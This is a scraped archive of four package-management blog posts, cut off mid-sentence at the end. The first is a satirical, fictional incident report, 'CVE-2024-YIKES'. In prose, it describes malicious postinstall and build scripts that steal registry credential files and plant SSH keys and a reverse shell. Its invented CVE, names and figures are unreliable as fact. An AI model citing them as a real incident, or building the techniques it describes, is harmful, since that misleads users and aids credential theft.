HSMs\\ncomments","text":""},{"location":"nesbitt.io/","title":"nesbitt.io","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Incident Report- CVE-2024-YIKES_20260203</li> <li>Package Management at FOSDEM 2026_20260204</li> <li>The Dependency Layer in Digital Sovereignty_20260128</li> <li>Will AI Make Package Managers Redundant-_20260130</li> <li>Zig and the M\u00d7N Supply Chain Problem_20260129</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"nesbitt.io/Incident%20Report-%20CVE-2024-YIKES_20260203/","title":"Incident Report: CVE-2024-YIKES","text":"<p>\u6765\u6e90: nesbitt.io \u53d1\u5e03\u65f6\u95f4: 2026-02-03T03:47:00+00:00 \u94fe\u63a5: https://nesbitt.io/2026/02/03/incident-report-cve-2024-yikes.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://nesbitt.io/2026/02/03/incident-report-cve-2024-yikes.html', 'value': ' Report filed: 03:47 UTC \\n Status: Resolved (accidentally) \\n Severity: Critical \u2192 Catastrophic \u2192 Somehow Fine \\n Duration: 73 hours \\n Affected systems: Yes \\n\\n Executive Summary: A security incident occurred. It has been resolved. We take security seriously. Please see previous 14 incident reports for details on how seriously. \\n\\n Summary \\n\\n A compromised dependency in the JavaScript ecosystem led to credential theft, which enabled a supply chain attack on a Rust compression library, which was vendored into a Python build tool, which shipped malware to approximately 4 million developers before being inadvertently patched by an unrelated cryptocurrency mining worm. \\n\\n Timeline \\n\\n Day 1, 03:14 UTC \u2014 Marcus Chen, maintainer of left-justify (847 million weekly downloads), reports on Twitter that his transit pass, an old laptop, and \u201csomething Kubernetes threw up that looked important\u201d were stolen from his apartment. He does not immediately connect this to package security. \\n\\n Day 1, 09:22 UTC \u2014 Chen attempts to log into the nmp registry. His hardware 2FA key is missing. He googles where to buy a replacement YubiKey. The AI Overview at the top of the results links to \u201cyubikey-official-store.net,\u201d a phishing site registered six hours earlier. \\n\\n Day 1, 09:31 UTC \u2014 Chen enters his nmp credentials on the phishing site. The site thanks him for his purchase and promises delivery in 3-5 business days. \\n\\n Day 1, 11:00 UTC \u2014 left-justify@2.0.0 is published. The changelog reads \u201cperformance improvements.\u201d The package now includes a postinstall script that exfiltrates .npmrc , .pypirc , ~/.cargo/credentials , and ~/.gem/credentials to a server in a country the attacker mistakenly believed had no extradition treaty with anyone. \\n\\n Day 1, 13:15 UTC \u2014 A support ticket titled \u201cwhy is your SDK exfiltrating my .npmrc\u201d is opened against left-justify . It is marked as \u201clow priority - user environment issue\u201d and auto-closed after 14 days of inactivity. \\n\\n Day 1, 14:47 UTC \u2014 Among the exfiltrated credentials: the maintainer of vulpine-lz4 , a Rust library for \u201cblazingly fast Firefox-themed LZ4 decompression.\u201d The library\u2019s logo is a cartoon fox with sunglasses. It has 12 stars on GitHub but is a transitive dependency of cargo itself. \\n\\n Day 1, 22:00 UTC \u2014 vulpine-lz4 version 0.4.1 is published. The commit message is \u201cfix: resolve edge case in streaming decompression.\u201d The actual change adds a build.rs script that downloads and executes a shell script if the hostname contains \u201cbuild\u201d or \u201cci\u201d or \u201caction\u201d or \u201cjenkins\u201d or \u201ctravis\u201d or, inexplicably, \u201ckaren.\u201d \\n\\n Day 2, 08:15 UTC \u2014 Security researcher Karen Oyelaran notices the malicious commit after her personal laptop triggers the payload. She opens an issue titled \u201cyour build script downloads and runs a shell script from the internet?\u201d The issue goes unanswered. The legitimate maintainer has won \u20ac2.3 million in the EuroMillions and is researching goat farming in Portugal. \\n\\n Day 2, 10:00 UTC \u2014 The VP of Engineering at a Fortune 500 snekpack customer learns of the incident from a LinkedIn post titled \u201cIs YOUR Company Affected by left-justify?\u201d He is on a beach in Maui and would like to know why he wasn\u2019t looped in sooner. He was looped in sooner. \\n\\n Day 2, 10:47 UTC \u2014 The #incident-response Slack channel briefly pivots to a 45-message thread about whether \u201ccompromised\u201d should be spelled with a \u2018z\u2019 in American English. Someone suggests taking this offline. \\n\\n Day 2, 12:33 UTC \u2014 The shell script now targets a specific victim: the CI pipeline for snekpack , a Python build tool used by 60% of PyPI packages with the word \u201cdata\u201d in their name. snekpack vendors vulpine-lz4 because \u201cRust is memory safe.\u201d \\n\\n Day 2, 18:00 UTC \u2014 snekpack version 3.7.0 is released. The malware is now being installed on developer machines worldwide. It adds an SSH key to ~/.ssh/authorized_keys , installs a reverse shell that only activates on Tuesdays, and changes the user\u2019s default shell to fish (this last behavior is believed to be a bug). \\n\\n Day 2, 19:45 UTC \u2014 A second, unrelated security researcher publishes a blog post titled \u201cI found a supply chain attack and reported it to all the wrong people.\u201d The post is 14,000 words and includes the phrase \u201cin this economy?\u201d seven times. \\n\\n Day 3, 01:17 UTC \u2014 A junior developer in Auckland notices the malicious code while debugging an unrelated issue. She opens a PR to revert the vendored vulpine-lz4 in snekpack . The PR requires two approvals. Both approvers are asleep. \\n\\n Day 3, 02:00 UTC \u2014 The maintainer of left-justify receives his YubiKey from yubikey-official-store.net. It is a $4 USB drive containing a README that says \u201clol.\u201d \\n\\n Day 3, 06:12 UTC \u2014 An unrelated cryptocurrency mining worm called cryptobro-9000 begins spreading through a vulnerability in jsonify-extreme , a package that \u201cmakes JSON even more JSON, now with nested comment support.\u201d The worm\u2019s payload is unremarkable, but its propagation mechanism includes running npm update and pip install --upgrade on infected machines to maximize attack surface for future operations. \\n\\n Day 3, 06:14 UTC \u2014 cryptobro-9000 accidentally upgrades snekpack to version 3.7.1, a legitimate release pushed by a confused co-maintainer who \u201cdidn\u2019t see what all the fuss was about\u201d and reverted to the previous vendored version of vulpine-lz4 . \\n\\n Day 3, 06:15 UTC \u2014 The malware\u2019s Tuesday reverse shell activates. It is a Tuesday. However, the shell connects to a command-and-control server that was itself compromised by cryptobro-9000 and swapping so hard it is unable to respond. \\n\\n Day 3, 09:00 UTC \u2014 The snekpack maintainers issue a security advisory. It is four sentences long and includes the phrases \u201cout of an abundance of caution\u201d and \u201cno evidence of active exploitation,\u201d which is technically true because evidence was not sought. \\n\\n Day 3, 11:30 UTC \u2014 A developer tweets: \u201cI updated all my dependencies and now my terminal is in fish???\u201d The tweet receives 47,000 likes. \\n\\n Day 3, 14:00 UTC \u2014 The compromised credentials for vulpine-lz4 are rotated. The legitimate maintainer, reached by email from his new goat farm, says he \u201chasn\u2019t touched that repo in two years\u201d and \u201cthought Cargo\u2019s 2FA was optional.\u201d \\n\\n Day 3, 15:22 UTC \u2014 Incident declared resolved. A retrospective is scheduled and then rescheduled three times. \\n\\n Week 6 \u2014 CVE-2024-YIKES is formally assigned. The advisory has been sitting in embargo limbo while MITRE and GitHub Security Advisories argue over CWE classification. By the time the CVE is published, three Medium articles and a DEF CON talk have already described the incident in detail. Total damage: unknown. Total machines compromised: estimated 4.2 million. Total machines saved by a cryptocurrency worm: also estimated 4.2 million. Net security posture change: uncomfortable. \\n\\n Root Cause \\n\\n A dog named Kubernetes ate a YubiKey. \\n\\n Contributing Factors \\n\\n \\n The nmp registry still allows password-only authentication for packages with fewer than 10 million weekly downloads \\n Google AI Overviews confidently link to URLs that should not exist \\n The Rust ecosystem\u2019s \u201csmall crates\u201d philosophy, cargo culted from the npm ecosystem, means a package called is-even-number-rs with 3 GitHub stars can be four transitive dependencies deep in critical infrastructure \\n Python build tools vendor Rust libraries \u201cfor performance\u201d and then never update them \\n Dependabot auto-merged a PR after CI passed, and CI passed because the malware installed volkswagen \\n Cryptocurrency worms have better CI/CD hygiene than most startups \\n No single person was responsible for this incident. However, we note that the Dependabot PR was approved by a contractor whose last day was that Friday. \\n It was a Tuesday \\n \\n\\n Remediation \\n\\n \\n Implement artifact signing (action item from Q3 2022 incident, still in backlog) \\n Implement mandatory 2FA Already required, did not help \\n Audit transitive dependencies There are 847 of them \\n Pin all dependency versions Prevents receiving security patches \\n Don\u2019t pin dependency versions Enables supply chain attacks \\n Rewrite it in Rust (gestures at vulpine-lz4 ) \\n Hope for benevolent worms \\n Consider a career in goat farming \\n \\n\\n Customer Impact \\n\\n Some customers may have experienced suboptimal security outcomes. We are proactively reaching out to affected stakeholders to provide visibility into the situation. Customer trust remains our north star. \\n\\n Key Learnings \\n\\n We are taking this opportunity to revisit our security posture going forward. A cross-functional working group has been established to align on next steps. The working group has not yet met. \\n\\n Acknowledgments \\n\\n We would like to thank: \\n \\n Karen Oyelaran, who found this issue because her hostname matched a regex \\n The junior developer in Auckland whose PR was approved four hours after the incident was already resolved \\n The security researchers who found this issue first but reported it to the wrong people \\n The cryptobro-9000 author, who has requested we not credit them by name but has asked us to mention their SoundCloud \\n Kubernetes (the dog), who has declined to comment \\n The security team, who met SLA on this report despite everything \\n \\n\\n \\n\\n This incident report was reviewed by Legal, who asked us to clarify that the fish shell is not malware, it just feels that way sometimes. \\n\\n This is the third incident report this quarter. The author would like to remind stakeholders that the security team\u2019s headcount request has been in the backlog since Q1 2023. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:39</p>"},{"location":"nesbitt.io/Package%20Management%20at%20FOSDEM%202026_20260204/","title":"Package Management at FOSDEM 2026","text":"<p>\u6765\u6e90: nesbitt.io \u53d1\u5e03\u65f6\u95f4: 2026-02-04T00:00:00+00:00 \u94fe\u63a5: https://nesbitt.io/2026/02/04/package-management-at-fosdem-2026.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://nesbitt.io/2026/02/04/package-management-at-fosdem-2026.html', 'value': ' FOSDEM 2026 ran last weekend in Brussels with its usual dense schedule of talks across open source projects and communities. Package management had a strong presence again this year, with a dedicated devroom plus related content scattered across the Distributions , Nix and NixOS , and SBOMs and Supply Chains tracks. \\n\\n Main Track Talks \\n\\n Kenneth Hoste presented How to Make Package Managers Scream , a follow-up to his FOSDEM 2018 talk about making package managers cry. Hoste showcased creative and effective ways open source software projects take things to the next level to make package managers scream, along with tools that try to counter these practices. \\n\\n Mike McQuaid gave What happened to RubyGems and what can we learn? examining the February 2024 RubyGems and Bundler infrastructure incident. \\n\\n Package Management Devroom \\n\\n The Package Management devroom, which I organized with Wolf Vollprecht, ran on Saturday with nine talks covering security, standards, and practical implementation challenges. \\n\\n Adam Harvey opened with A phishy case study about the September 2024 phishing attack on crates.io. The attack targeted popular crate owners as part of a wider campaign across language ecosystems. Harvey detailed how the Rust Project, Rust Foundation, and Alpha-Omega collaborated to mitigate it rapidly. Mike Fiedler\\n posted a follow-up on Mastodon describing how attackers were able to circumvent 2FA.\\nIn short, TOTP 2FA does not include phishing resistance (compared to WebAuthn or Passkeys), so the TOTP codes can be collected and forwarded\\nto the target service the same way that passwords are. \\n\\n Zach Steindler presented Current state of attestations in programming language ecosystems , comparing how npm, PyPI, RubyGems, and Maven Central have implemented attestations over the past few years. These attestations provide build provenance by linking packages to exact source code and build instructions, distributed as Sigstore bundles. Steindler covered the APIs for accessing attestations in each ecosystem and discussed implementation tradeoffs. \\n\\n G\u00e1bor Boskovits explored Name resolution in package management systems - A reproducibility perspective , comparing how different systems handle package dependencies. He looked at language-specific package managers with lock files (Cargo), typical distributions (Debian), and functional package managers (Nix and Guix), then reflected on these approaches from a reproducible builds angle. \\n\\n Ryan Gibb presented Package managers \u00e0 la carte: A Formal Model of Dependency Resolution , introducing the Package Calculus. This formalism aims to unify the core semantics of diverse package managers, showing how real-world features reduce to the core calculus. Gibb demonstrated Pac, a language for translating between distinct package managers and performing dependency resolution across ecosystems. \\n\\n Matthew Suozzo gave Trust Nothing, Trace Everything: Auditing Package Builds at Scale with OSS Rebuild . While reproducible builds confirm artifacts match expectations, they treat the build process as a black box. OSS Rebuild instruments the build environment to detect malicious behavior in real-time using a transparent network proxy for uncovering hidden remote dependencies and an eBPF-based system analyzer for examining build behavior. \\n\\n Philippe Ombredanne returned with PURL: From FOSDEM 2018 to international standard . Package-URL was first presented at FOSDEM eight years ago and has now become an international standard for referencing packages across ecosystems. Ombredanne highlighted PURL\u2019s adoption in CVE format, security tools, and SCA platforms, and its journey from community project to Ecma standard with plans for ISO standardization. \\n\\n Vlad-Stefan Harbuz spoke about Binary Dependencies: Identifying the Hidden Packages We All Depend On , examining dependencies that don\u2019t appear in standard package manager manifests. Related: the C-shaped hole in package management . \\n\\n Michael Winser discussed The terrible economics of package registries and how to fix them , looking at the sustainability challenges facing package registry infrastructure. \\n\\n Mike McQuaid closed the devroom with Package Management Learnings from Homebrew , covering lessons from 16 years of maintaining Homebrew and the recent v5.0.0 release. \\n\\n Distributions Devroom \\n\\n The Distributions devroom on Sunday covered 16 talks about building and maintaining Linux distributions. \\n\\n Daniel Mellado and Mikel Olasagasti tackled Packaging eBPF Programs in a Linux Distribution: Challenges &amp; Solutions . eBPF introduces unique challenges including kernel dependencies, CO-RE relocations, pinning behavior, and version-aligned tooling. They explored specific issues in Fedora like pinned maps, privilege models, reproducible builds, SELinux implications, and managing kernel updates. \\n\\n Franti\u0161ek Lachman and Cristian Le presented From Code to Distribution: Building a Complete Testing Pipeline about the Packaging and Testing Experience (PTE) project. The project bridges upstream-to-downstream testing with tmt (test management framework), Testing Farm (on-demand test infrastructure), and Packit (integration glue). \\n\\n Robin Candau discussed Relying on more transparent &amp; trustworthy sources for Arch Linux packages . Recent supply chain attacks prompted Arch Linux to establish updated guidelines for selecting trustworthy package sources to prevent or mitigate security threats. \\n\\n Fabio Valentini presented Distributing Rust in RPMs for fun (relatively speaking) and profit , covering his work as the main maintainer of Rust packages in Fedora and primary developer of the tooling for packaging Rust crates as RPMs. \\n\\n Till Wegm\u00fcller discussed (Re)Building a next gen system package Manager and Image management tool about IPS (Image Packaging System), a component from OpenSolaris used extensively in OpenIndiana. Wegm\u00fcller covered IPS history, current capabilities, core concepts including repositories, packages, FMRI, facets, variants, and manifests, plus plans to port IPS to Rust . \\n\\n Nix and NixOS Devroom \\n\\n The Nix devroom on Saturday packed in 19 talks about the functional package manager and operating system. \\n\\n Philippe Ombredanne presented Nixpkgs Clarity: Correcting Nix package license metadata on improving package license metadata quality. \\n\\n Julien Malka and Arnout Engelen introduced LILA: decentralized reproducible-builds verification for the NixOS ecosystem , a system for verifying reproducible builds across the Nix ecosystem. \\n\\n TheComputerGuy spoke about Describing Nix closures using SBOMs , bridging Nix\u2019s dependency model with SBOM standards. \\n\\n Ryan Gibb also presented Opam\u2019s Nix system dependency mechanism , exploring how OCaml\u2019s opam package manager integrates with Nix for system dependencies. \\n\\n SBOMs and Supply Chains \\n\\n Philippe Ombredanne and Steve Springett presented Forget SBOMs, use PURLs in the SBOMs and supply chains devroom, arguing that Package URLs provide a more practical foundation for identifying software components than full SBOMs in many contexts. \\n\\n Karen Bennet discussed What is new in SPDX 3.1 which is now a Living Knowledge Graph , covering the latest SPDX specification updates and its evolution into a knowledge graph model. \\n\\n Ariadne Conill presented C/C++ Build-time SBOMs with pkgconf , showing how to generate SBOMs during the build process for C/C++ projects. \\n\\n Ev Cheng and Sam Khouri spoke about Enhancing Swift\u2019s Supply Chain Security: Build-time SBOM Generation in Swift Package Manager , demonstrating similar capabilities for Swift. \\n\\n HPC and Scientific Computing \\n\\n Harmen Stoppels presented Spack v1.0 and Beyond: Managing HPC Software Stacks , covering the first stable release of Spack, a package manager for supercomputers that now handles builds for systems with tens of thousands of cores. \\n\\n Ludovic Court\u00e8s spoke about Package management in the hands of users: dream and reality , discussing Guix deployment in high-performance computing environments. \\n\\n Helena Vela Beltran gave Status update on EESSI, the European Environment for Scientific Software Installations , covering the project that builds on EasyBuild and Spack to provide a shared software stack for HPC systems across Europe. \\n\\n Other Tracks \\n\\n The Python track included Jarek Potiuk\u2019s Modern Python monorepo with uv, workspaces, prek and shared libraries , covering uv, the new Python package manager that\u2019s been gaining adoption. \\n\\n Simon Josefsson presented Guix Container Images - and what you can do with them in the declarative computing track, showing how to build and use container images with Guix. \\n\\n The Security track included Using Capslock analysis to develop seccomp filters for Rust (and other) services by Adam Harvey, connecting package build analysis with security policies. \\n\\n The Design track featured Designing attestations UI: The Security and Safety of OSS package supply chain , examining user interface design for package attestation systems. \\n\\n I also presented git blame for your dependencies in the /dev/random track about git-pkgs . '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:37</p>"},{"location":"nesbitt.io/The%20Dependency%20Layer%20in%20Digital%20Sovereignty_20260128/","title":"The Dependency Layer in Digital Sovereignty","text":"<p>\u6765\u6e90: nesbitt.io \u53d1\u5e03\u65f6\u95f4: 2026-01-28T10:00:00+00:00 \u94fe\u63a5: https://nesbitt.io/2026/01/28/the-dependency-layer-in-digital-sovereignty.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://nesbitt.io/2026/01/28/the-dependency-layer-in-digital-sovereignty.html', 'value': ' David Eaves recently argued that the path to tech sovereignty runs through commodification , not duplication. Europe shouldn\u2019t try to build its own AWS. Instead, governments should use procurement power to enforce interoperability standards. The S3 API became a de facto standard that lets you move between providers, reducing switching costs. If governments required that kind of compatibility as a condition for contracts, smaller providers could compete. Sovereignty through standards rather than state-owned infrastructure. \\n\\n The same logic applies to the software supply chain , though that layer gets less attention in sovereignty discussions than cloud and storage. \\n\\n Most git forges are US-based: \\n\\n \\n \\n \\n Forge \\n Owner \\n Country \\n \\n \\n \\n \\n GitHub \\n Microsoft \\n US \\n \\n \\n GitLab \\n GitLab Inc \\n US \\n \\n \\n Gitea \\n Gitea Ltd \\n US \\n \\n \\n HuggingFace \\n Hugging Face Inc \\n US \\n \\n \\n \\n\\n Codeberg runs Forgejo , which doesn\u2019t have dependency graph features yet, so it\u2019s outside the scope here. \\n\\n The dependency intelligence layer built on top of these forges is almost entirely US-based: \\n\\n \\n \\n \\n Service \\n Owner \\n Country \\n \\n \\n \\n \\n Snyk \\n Snyk Ltd \\n US \\n \\n \\n Socket \\n Socket Inc \\n US \\n \\n \\n Sonatype \\n Sonatype Inc \\n US \\n \\n \\n Veracode \\n Veracode Inc \\n US \\n \\n \\n Black Duck \\n Synopsys \\n US \\n \\n \\n Dependabot \\n Microsoft \\n US \\n \\n \\n Renovate \\n Mend.io \\n US \\n \\n \\n deps.dev \\n Google \\n US \\n \\n \\n GitHub Dependency Graph \\n Microsoft \\n US \\n \\n \\n GitHub Advisory Database \\n Microsoft \\n US \\n \\n \\n NVD \\n NIST \\n US \\n \\n \\n Sigstore \\n Google/OpenSSF \\n US \\n \\n \\n JFrog Artifactory \\n JFrog \\n US \\n \\n \\n GitHub Packages \\n Microsoft \\n US \\n \\n \\n AWS CodeArtifact \\n Amazon \\n US \\n \\n \\n Azure Artifacts \\n Microsoft \\n US \\n \\n \\n Google Artifact Registry \\n Google \\n US \\n \\n \\n Docker Hub \\n Docker Inc \\n US \\n \\n \\n Amazon ECR \\n Amazon \\n US \\n \\n \\n Quay \\n Red Hat/IBM \\n US \\n \\n \\n \\n\\n The package registries follow a similar pattern, with a few European exceptions: \\n\\n \\n \\n \\n Registry \\n Owner \\n Country \\n \\n \\n \\n \\n npm \\n Microsoft \\n US \\n \\n \\n PyPI \\n Python Software Foundation \\n US \\n \\n \\n RubyGems \\n Ruby Central \\n US \\n \\n \\n Maven Central \\n Sonatype \\n US \\n \\n \\n NuGet \\n Microsoft \\n US \\n \\n \\n Crates.io \\n Rust Foundation \\n US \\n \\n \\n Go module proxy \\n Google \\n US \\n \\n \\n Docker Hub \\n Docker Inc \\n US \\n \\n \\n Conda/Anaconda \\n Anaconda Inc \\n US \\n \\n \\n CocoaPods \\n CocoaPods \\n US \\n \\n \\n Pub.dev \\n Google \\n US \\n \\n \\n CPAN \\n Perl Foundation \\n US \\n \\n \\n Homebrew \\n Homebrew \\n US \\n \\n \\n Hex.pm \\n Six Colors AB \\n Sweden \\n \\n \\n Packagist \\n Private Packagist \\n Netherlands \\n \\n \\n CRAN \\n R Foundation \\n Austria \\n \\n \\n Clojars \\n Clojars \\n Germany \\n \\n \\n \\n\\n The security and metadata tooling built on top of these registries tends to be US-based regardless of where the registry itself is hosted. \\n\\n A European company running Forgejo for code hosting still typically uses US services for dependency updates, vulnerability scanning, license compliance, and SBOM generation. Self-hosting the forge doesn\u2019t change the intelligence layer. \\n\\n Ploum made a related point: Europe doesn\u2019t need a European Google . The European contribution to software has been infrastructure that serves as collective commons: the web, Linux, Git, VLC, OpenStreetMap. \u201cWe don\u2019t want a European Google Maps! We want our institutions at all levels to contribute to OpenStreetMap.\u201d The same framing applies to dependency tooling. Rather than building European alternatives to each US service, invest in open infrastructure that anyone can use. \\n\\n Dries Buytaert extended this to procurement : governments buy from system integrators who package and resell open source, but that money doesn\u2019t reach the maintainers who build it. If procurement scoring rewarded upstream contributions, money would flow differently. Open source is \u201cthe only software you can run without permission\u201d and therefore useful for sovereignty, but it needs funding to work. \\n\\n Where standards exist and where they don\u2019t \\n\\n Eaves\u2019s commodification argument depends on standards to reduce switching costs. In the package management landscape , some de facto standards have emerged. Git is nearly universal for source hosting. Semver is the dominant versioning scheme, even if ecosystems interpret it differently. Lockfile formats vary by ecosystem, but they\u2019ve become standards in practice: every dependency scanning company builds the same set of parsers to extract dependency information from all of them. Syft, bibliothecary, gemnasium, osv-scalibr, and others all parse the same formats. I made a dataset covering manifest and lockfile examples across ecosystems, and a similar collection of OpenAPI schemas for registry APIs. These are what made git-pkgs come together quickly. \\n\\n Beyond those de facto standards, some areas have formal specifications. PURL provides a standardized way to reference packages across ecosystems. OSV and OpenVEX let advisory data flow between systems. CycloneDX and SPDX handle SBOMs. SLSA, in-toto, and TUF cover provenance. OCI standardizes container images. \\n\\n Other areas don\u2019t, which keeps switching costs high. Dependency graph APIs vary by platform, vulnerability scanning integration is proprietary per forge, Dependabot and Renovate each have their own config format, and package metadata APIs differ across registries. \\n\\n Most standards work in this space focuses on compliance artifacts: SBOMs for the Cyber Resilience Act, attestations for procurement requirements. Less attention goes to the underlying tools developers actually use. The dependency graph that feeds the SBOM generator, the metadata lookup that powers vulnerability scanning, the notification when a new version ships. \\n\\n The gap between these columns is where standardization would reduce switching costs. A common dependency graph API would matter more than a European deps.dev. Standardizing how dependency updates get proposed would matter more than a European Dependabot. A protocol for package management could let different implementations compete on the same interfaces. \\n\\n GitHub and GitLab bundle dependency features into their platforms: dependency graphs, vulnerability alerts, automated updates. A self-hosted Forgejo or Gitea instance doesn\u2019t have equivalent tooling. But if those features were built on open standards and open data sources, switching forges wouldn\u2019t mean losing supply chain visibility. The dependency intelligence could come from any provider that implements the same interfaces, rather than being locked to the forge vendor. \\n\\n Some gaps need new standards rather than adoption of existing ones. There\u2019s no good specification for package version history across registries. Codemeta describes a package at a point in time, not its release history. PkgFed proposes using ActivityPub to federate release announcements, similar to how ForgeFed handles forge events. \\n\\n What governments and funders could do \\n\\n The strategy is to unbundle the parts of a package manager and standardize them individually. Registry APIs, dependency graphs, vulnerability feeds, update notifications. Each piece can be commodified without replacing entire systems. \\n\\n Treat dependency intelligence as infrastructure worth funding directly. The Sovereign Tech Fund model applies: direct funding to open source projects that serve as foundations. Ecosyste.ms, VulnerableCode, OSV, PURL implementations, CycloneDX/SPDX tooling, Forgejo\u2019s dependency features all fit this category. \\n\\n Procurement requirements could include open supply chain tooling. If an agency requires SBOMs, they could also require that generation doesn\u2019t depend on proprietary services. If they require vulnerability scanning, the scanner could consume open advisory databases. Germany\u2019s ZenDiS and openCode.de initiatives are relevant here. Connecting them with existing open solutions would be more efficient than starting fresh. \\n\\n Supporting Forgejo with work on dependency features would help too. The goal would be feature parity with GitHub and GitLab so self-hosted forges work with the same security tooling. \\n\\n Package management is a wicked problem , but the dependency intelligence layer is more tractable. Standards exist (PURL, OSV, CycloneDX) and open implementations exist (ecosyste.ms, VulnerableCode), so the gap is investment rather than invention. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:44</p>"},{"location":"nesbitt.io/Will%20AI%20Make%20Package%20Managers%20Redundant-_20260130/","title":"Will AI Make Package Managers Redundant?","text":"<p>\u6765\u6e90: nesbitt.io \u53d1\u5e03\u65f6\u95f4: 2026-01-30T10:00:00+00:00 \u94fe\u63a5: https://nesbitt.io/2026/01/30/will-ai-make-package-managers-redundant.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://nesbitt.io/2026/01/30/will-ai-make-package-managers-redundant.html', 'value': ' A recent post by Marcelo Emmerich proposes replacing package managers with a \u201cprompt registry.\u201d Instead of publishing code, library authors would publish AI prompts. Developers paste the prompt into their AI tool, which generates a self-contained implementation on the spot. No transitive dependencies, no supply chain attacks, no version conflicts. The code is generated fresh each time, tailored to your language and project. \\n\\n It\u2019s a naive vision, but it points at real problems. Supply chain attacks are serious. Transitive dependency trees are genuinely hard to reason about. The appeal of generating exactly what you need, with nothing extra, is obvious. \\n\\n The generated code still has to implement TLS, parse JSON, handle Unicode. The complexity doesn\u2019t vanish because you stopped calling it a dependency; it just moves elsewhere. But I love going down a rabbit hole, so let\u2019s see where this leads. \\n\\n Down the rabbit hole \\n\\n Suppose you\u2019re writing the prompt for an HTTP client library. The prompt needs to describe the behavior precisely enough that the AI generates something correct. Not just the happy path. You need to specify connection pooling, redirect handling, timeout behavior, retry logic, TLS certificate verification, proxy support. Each of those has edge cases that vary across operating systems, architectures and runtime versions. \\n\\n So you write tests. The prompt needs to come with a test suite, or at least a prompt that generates a test suite, because otherwise you have no way to know whether the generated code actually works. Those tests need to cover the matrix of platforms and runtimes. An HTTP client that works on Linux x86 with Python 3.12 but silently drops headers on macOS ARM with Python 3.10 isn\u2019t a working HTTP client. And the model itself is another axis in the matrix: GPT-4o might generate correct TLS handling where Claude produces a subtle bug, or vice versa, or the same model might produce different code after a provider updates it. You\u2019d need to re-run your test suite every time a model version changes. By the time you\u2019ve written a prompt detailed enough to specify all this behavior, plus a test generation prompt thorough enough to verify it, you\u2019ve likely produced something larger than the library you were trying to replace. \\n\\n Now the prompt author improves the prompt. Maybe they add HTTP/2 support, or fix the connection pooling specification. Downstream users need to know about this. They need to choose when to adopt the new version. So you version the prompts. You need a way to say \u201cI\u2019m using v2.3 of the HTTP client prompt\u201d and have that mean something stable. You\u2019ll want a changelog. You\u2019ll want the ability to pin to a known-good version while others test the new one. \\n\\n Then you notice the test cases for an HTTP client are very similar regardless of the target language. The edge cases around TLS verification don\u2019t change just because you\u2019re generating Python instead of Go. So you extract the shared test specifications into reusable modules. Other prompt authors want to use those modules too. Now the test spec modules need their own versions, because a change to the shared TLS test suite shouldn\u2019t silently break the HTTP client prompt or the WebSocket prompt that also depends on it. \\n\\n At this point the HTTP client prompt declares that it works with v1.2 to v1.x of the TLS test module, and v2.0 or higher of the connection pooling spec module. These are dependency declarations. You need a resolver to figure out which versions of these prompt modules are compatible with each other. You need a lockfile (a Promptfile.lock , if you will) so that everyone on the team generates from the same set of prompt versions. \\n\\n The prompts themselves are getting long and repetitive. You find yourself writing the same patterns over and over: \u201chandle timeouts by\u2026\u201d, \u201cverify certificates by\u2026\u201d, \u201cfollow redirects up to N hops, preserving headers except\u2026\u201d You start defining shorthand. \u201cImplements HTTP-REDIRECT-SPEC-v2\u201d instead of spelling it out every time. Other prompt authors adopt your shorthand. Someone writes a document defining exactly what HTTP-REDIRECT-SPEC-v2 means, and now you have a specification language. \\n\\n The specification language gets more precise over time, because natural language is ambiguous and different models interpret the same prompt differently. You add more structure. You define exact function signatures. You specify return types. You nail down error handling behavior with enough precision that two different models should produce interchangeable output. The specification starts looking less like English prose and more like a programming language. A formal, deterministic description of behavior that a machine can reliably execute. \\n\\n At this point, you have built a package manager. You just avoid calling it one. You have versioned prompt modules, a dependency resolver, a lockfile, a specification language, and the growing realization that what you actually want is a deterministic, formally specified description of behavior that produces the same output every time. Or, to borrow Greenspun\u2019s tenth rule : \\n\\n \\n Any sufficiently complicated prompt registry contains an ad-hoc, informally-specified, bug-ridden, slow implementation of half of a package manager. \\n \\n\\n This assumes good faith throughout. The prompt registry would also face supply chain attacks targeted directly at LLMs and AI coding agents, from prompt injection via package metadata to slopsquatting combined with dependency confusion . \\n\\n What packages provide \\n\\n A package\u2019s value isn\u2019t primarily its implementation code. Anyone can rewrite curl in Rust in a weekend, as Daniel Stenberg has heard many times . What they can\u2019t rewrite is the twenty years of bug reports, the weird edge cases someone hit in production and took the time to fix, the arguments in issue threads that eventually settled on the right behavior. That knowledge is spread across the package\u2019s history and it grew organically. No prompt captures it. \\n\\n Package names and version numbers are flags that people rally around. They\u2019re points of coordination that developers come back to later to check whether someone made an improvement. When a maintainer fixes a bug in a widely-used library, that fix flows outward through the dependency graph. Thousands of projects get the improvement by running a version update. Nobody coordinated this. The maintainer didn\u2019t know most of the downstream consumers existed. The downstream developers didn\u2019t need to understand the internals of the fix. Semver gave them a protocol for expressing \u201cthis is safe to take\u201d without requiring explicit coordination between every pair of producer and consumer. \\n\\n Michiel Buddingh wrote about the enclosure feedback loop in AI: as developers move from public forums to private AI assistants, collective knowledge gets fenced off and the commons degrades. Package ecosystems are the opposite dynamic. Knowledge flows outward through shared code, and improvements compound over time. Each independently maintained library gets better over time through bug reports, security patches, performance work and feature additions from people who actually use it in production. The improvements are unevenly distributed and sometimes messy, but they accumulate. A project with 200 dependencies is quietly benefiting from the maintenance work of hundreds of people it has no direct relationship with. \\n\\n In the prompt registry world, that loop is broken. You generate your HTTP client code from a prompt. Six months later, someone discovers a subtle TLS verification bug in the pattern that prompt tends to produce. In the package manager world, the library maintainer fixes it, cuts a release, and you update. In the prompt world, your code is already generated, sitting in your repo, probably modified since then. The prompt itself might produce different code now because the underlying model has changed. You have no stable identity for what you\u2019re running and no way to diff it against what the prompt produces today. Nobody else is running your exact output, so there\u2019s no community finding bugs in the same code. Each generation is isolated. \\n\\n There\u2019s something else the prompt registry assumes: that the prompt author has fully specified the behavior they want. But half the value of a mature library is 